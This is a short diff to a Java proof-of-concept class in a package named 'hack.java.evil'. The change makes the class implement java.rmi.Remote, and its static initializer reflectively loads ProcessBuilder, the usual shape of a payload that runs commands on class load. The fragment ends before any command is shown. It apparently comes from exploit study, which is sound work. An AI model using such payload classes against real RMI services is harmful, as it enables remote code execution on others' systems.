@@ -1,12 +1,13 @@
 package com.xjjlearning.hack.java.evil;
 
+import java.rmi.Remote;
 import java.util.Arrays;
 import java.util.List;
 
 /**
  * created by xjj on 2023/1/17
  */
-public class PocWithProcessBuilder {
+public class PocWithProcessBuilder implements Remote {
     static {
         try {
             Class<?> clazz = Class.forName("java.lang.ProcessBuilder");
